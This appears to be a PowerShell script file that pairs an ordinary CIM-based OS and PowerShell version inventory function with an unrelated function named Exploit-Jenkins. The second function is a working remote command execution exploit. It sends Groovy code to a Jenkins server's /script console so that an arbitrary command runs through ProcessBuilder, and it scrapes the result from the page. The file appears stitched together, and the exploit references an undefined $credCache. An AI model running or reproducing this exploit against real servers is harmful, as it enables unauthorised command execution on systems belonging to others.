
function Get-MrOSInfo {



    [CmdletBinding()]
    param (
        [Microsoft.Management.Infrastructure.CimSession[]]$CimSession
    )

    $Params = @{}

    if ($PSBoundParameters.CimSession) {
        $Params.CimSession = $CimSession
    }
   
    $OSInfo = Get-CimInstance @Params -ClassName Win32_OperatingSystem -Property Caption, BuildNumber, OSArchitecture, CSName

    $OSVersion = Invoke-CimMethod @Params -Namespace root\cimv2 -ClassName StdRegProv -MethodName GetSTRINGvalue -Arguments @{
                    hDefKey=[uint32]2147483650; sSubKeyName='SOFTWARE\Microsoft\Windows NT\CurrentVersion'; sValueName='ReleaseId'}

    $PSVersion = Invoke-CimMethod @Params -Namespace root\cimv2 -ClassName StdRegProv -MethodName GetSTRINGvalue -Arguments @{
                    hDefKey=[uint32]2147483650; sSubKeyName='SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine'; sValueName='PowerShellVersion'}

    foreach ($OS in $OSInfo) {
        if (-not $PSBoundParameters.CimSession) {
            $OSVersion.PSComputerName = $OS.CSName
            $PSVersion.PSComputerName = $OS.CSName
        }
        
        $PS = $PSVersion | Where-Object PSComputerName -eq $OS.CSName
                    
        if (-not $PS.sValue) {
            $Params2 = @{}
            
            if ($PSBoundParameters.CimSession) {
                $Params2.CimSession = $CimSession | Where-Object ComputerName -eq $OS.CSName
            }

            $PS = Invoke-CimMethod @Params2 -Namespace root\cimv2 -ClassName StdRegProv -MethodName GetSTRINGvalue -Arguments @{
                        hDefKey=[uint32]2147483650; sSubKeyName='SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine'; sValueName='PowerShellVersion'}
        }
            
        [pscustomobject]@{
            ComputerName = $OS.CSName
            OperatingSystem = $OS.Caption
            Version = ($OSVersion | Where-Object PSComputerName -eq $OS.CSName).sValue
            BuildNumber = $OS.BuildNumber
            OSArchitecture = $OS.OSArchitecture
            PowerShellVersion = $PS.sValue
                                        
        }
            
    }

}
 function Exploit-Jenkins() {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string] $Rhost,
        [Parameter(Mandatory=$True)]
        [string] $Cmd,
        [Parameter(Mandatory=$False)]
        [Int] $Port
    )
 Add-Type -Assembly System.Web
 $url = "http://"+$($Rhost)+":"+$($Port)+"/script"
 
 $cookiejar = New-Object System.Net.CookieContainer
 $Cmd = $Cmd -replace "\s","','"
 $Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)
 
 $webrequest = [System.Net.HTTPWebRequest]::Create($url);
 $webrequest.CookieContainer = New-Object System.Net.CookieContainer;
 $webrequest.Method = "GET"
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer = $cookiejar }
 $response = $webrequest.GetResponse()
 $responseStream = $response.GetResponseStream()
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 

 $postdata="script=println+new+ProcessBuilder%28%27"+$($Cmd)+"%27%29.redirectErrorStream%28true%29.start%28%29.text&Submit=Run"
 $bytearray = [System.Text.Encoding]::UTF8.GetBytes($postdata)
 
 
 $webrequest = [System.Net.HTTPWebRequest]::Create($url)
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer=$cookiejar }
 $webrequest.Method = "POST"
 $webrequest.ContentType = "application/x-www-form-urlencoded"
 $webrequest.ContentLength = $bytearray.Length
 $requestStream = $webrequest.GetRequestStream()
 
 
 $requestStream.Write($bytearray, 0, $bytearray.Length)
 $requestStream.Close()
 $response = $webrequest.GetResponse()
 $responseStream  = $response.GetResponseStream()
 
 
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 $null = $output -match "Result</h2><pre>((?si).+?)</pre>"
 
 
 return $matches[1]
 }
